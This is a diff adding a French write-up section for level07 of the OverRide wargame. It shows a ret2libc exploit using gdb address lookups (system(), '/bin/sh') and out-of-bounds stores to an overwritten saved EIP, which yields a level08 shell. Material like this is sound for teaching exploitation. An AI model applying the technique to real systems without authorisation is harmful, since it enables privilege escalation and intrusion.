@@ -132,6 +132,69 @@ Program received signal SIGSEGV, Segmentation fault.
 0xdeadbeef in ?? ()	<-- Nice
 ```
 
+Utilisons a présent une attaque ret2libc:
+  - On sait que l'eip `0xffffd70c` est stocké a l'index+114 soit `1073741938`, c'est la qu'on écrira l'adresse du syscall `system`.
+  - L'index + 115 est l'adresse retour, on peut y mettre l'adresse d'exit si on souhaite quitter le programme proprement.
+  - L'index + 116 doit contenir notre string `/bin/sh`
+  
+Localisons ces addresses:
+
+```
+(gdb) info function system
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xf7e6aed0  __libc_system
+0xf7e6aed0  system	<-- Ici
+0xf7f48a50  svcerr_systemerr
+(gdb) p 0xf7e6aed0
+$11 = 4159090384	<-- En décimal pour le stockage
+
+(gdb) info proc map
+process 8082
+Mapped address spaces:
+[...]
+Start Addr   End Addr       Size     Offset objfile
+[...]
+    0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+    0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+    0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+    0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+(gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
+0xf7f897ec	<-- ici
+1 pattern found.
+(gdb) p 0xf7f897ec
+$12 = 4160264172	<-- en décimal
+```
+
+Ce qui nous donne:
+
+```
+evel07@OverRide:~$ ./level07 
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!   
+----------------------------------------------------
+[...]
+
+Input command: store
+ Number: 4159090384	<--- system()
+ Index: 1073741938	<--- EIP
+ Completed store command successfully
+Input command: store
+ Number: 4160264172	<--- "/bin/sh"
+ Index: 116		<-- System(114) + ret_addr(115) + "/bin/sh"(116)
+ Completed store command successfully
+```
+
+Et maintenant il ne reste plus qu'a pop l'eip enrégistré en quittant le main:
+
+```
+[...]
+Input command: quit
+$ whoami
+level08
+$ 
+```
 
 
 
